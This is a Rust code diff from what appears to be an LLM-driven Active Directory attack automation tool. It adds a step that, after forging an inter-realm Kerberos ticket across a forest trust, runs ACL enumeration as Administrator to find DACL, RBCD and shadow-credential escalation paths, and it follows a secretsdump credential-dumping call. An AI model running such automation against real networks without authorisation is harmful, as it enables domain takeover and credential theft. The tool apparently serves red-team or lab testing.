@@ -2446,6 +2446,106 @@ async fn dispatch_post_ticket_user_enumeration(
     }
 }
 
+/// Run ACL enumeration directly with the forged inter-realm ticket.
+///
+/// The LLM-routed ACL fallback often burns a turn trying the placeholder
+/// password before the resolver flips to GSSAPI. Dispatching the Kerberos
+/// LDAP tool directly keeps the SID-filtered trust path productive: parser
+/// discoveries from `ldap_acl_enumeration` feed DACL/RBCD/shadow-credential
+/// automations without waiting for another recon agent round.
+async fn dispatch_post_ticket_acl_enumeration(
+    dispatcher: &Dispatcher,
+    source_domain: &str,
+    target_domain: &str,
+) {
+    let target_lower = target_domain.to_lowercase();
+
+    let (target_dc_ip, target_dc_fqdn) = {
+        let s = dispatcher.state.read().await;
+        let Some(dc_ip) = s.resolve_dc_ip(target_domain) else {
+            warn!(
+                source_domain,
+                target_domain, "post-ticket ACL enum skipped: no DC IP for target domain"
+            );
+            return;
+        };
+        let dc_fqdn = s
+            .hosts
+            .iter()
+            .find(|h| h.ip == dc_ip && !h.hostname.is_empty())
+            .map(|h| {
+                let hn = h.hostname.to_lowercase();
+                if hn.ends_with(&format!(".{target_lower}")) || hn == target_lower {
+                    hn
+                } else {
+                    format!("{hn}.{target_lower}")
+                }
+            });
+        (dc_ip, dc_fqdn)
+    };
+
+    let target = target_dc_fqdn.unwrap_or_else(|| target_dc_ip.clone());
+    let tool_args = json!({
+        "target": target,
+        "target_ip": target_dc_ip,
+        "domain": target_domain,
+        "username": "Administrator",
+        "bind_domain": source_domain,
+    });
+    let call = ToolCall {
+        id: format!("post_ticket_acl_{}", uuid::Uuid::new_v4().simple()),
+        name: "ldap_acl_enumeration".to_string(),
+        arguments: tool_args,
+    };
+    let task_id = format!(
+        "post_ticket_acl_{}",
+        &uuid::Uuid::new_v4().simple().to_string()[..12]
+    );
+
+    info!(
+        task_id = %task_id,
+        source_domain,
+        target_domain,
+        "Post-ticket ACL enumeration dispatched (direct Kerberos LDAP tool)"
+    );
+
+    match dispatcher
+        .llm_runner
+        .tool_dispatcher()
+        .dispatch_tool("recon", &task_id, &call)
+        .await
+    {
+        Ok(exec) => {
+            if let Some(err) = exec.error {
+                warn!(
+                    err = %err,
+                    source_domain,
+                    target_domain,
+                    "Post-ticket ACL enumeration returned tool error"
+                );
+                return;
+            }
+            let vuln_count = exec
+                .discoveries
+                .as_ref()
+                .and_then(|d| d.get("vulnerabilities"))
+                .and_then(|v| v.as_array())
+                .map(|v| v.len())
+                .unwrap_or(0);
+            info!(
+                source_domain,
+                target_domain, vuln_count, "Post-ticket ACL enumeration completed"
+            );
+        }
+        Err(e) => warn!(
+            err = %e,
+            source_domain,
+            target_domain,
+            "Post-ticket ACL enumeration dispatch failed"
+        ),
+    }
+}
+
 /// Forge an inter-realm Kerberos ticket for a SID-filtered cross-forest trust.
 ///
 /// Called from the suppression branch of `auto_trust_follow` when
@@ -2615,6 +2715,8 @@ async fn dispatch_create_inter_realm_ticket(
             // costs ~5-10 s on failure and saves the entire MSSQL-pivot wait
             // (historically ~60 min) on success.
             dispatch_post_ticket_secretsdump(dispatcher, source_domain, target_domain).await;
+
+            dispatch_post_ticket_acl_enumeration(dispatcher, source_domain, target_domain).await;
         }
         Err(e) => {
             tracing::warn!(
